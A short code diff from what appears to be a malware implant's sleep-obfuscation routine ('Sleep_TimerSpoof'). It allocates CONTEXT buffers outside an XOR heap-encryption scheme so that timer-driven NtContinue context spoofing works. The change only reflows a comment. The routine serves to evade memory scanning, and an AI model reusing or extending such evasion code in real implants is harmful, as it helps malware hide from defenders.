@@ -37,8 +37,7 @@ DECLFN void Sleep_TimerSpoof( ULONG ms )
     NTSTATUS st;
 
     // VirtualAlloc - NOT via Heap_Alloc so HeapCrypt never touches these.
-    // If we used Heap_Alloc, HeapCrypt would XOR-encrypt Ctx/CtxBkp/CtxSpf before the
-    // timers fire, so NtContinue would read encrypted garbage and crash.
+    // If we used Heap_Alloc, HeapCrypt would XOR-encrypt Ctx/CtxBkp/CtxSpf before the timers fire, so NtContinue would read encrypted garbage and crash.
     // VirtualAlloc also returns zeroed pages so no Mem_Set needed.
     CONTEXT* CtxCapture = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
     CONTEXT* CtxBkp     = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
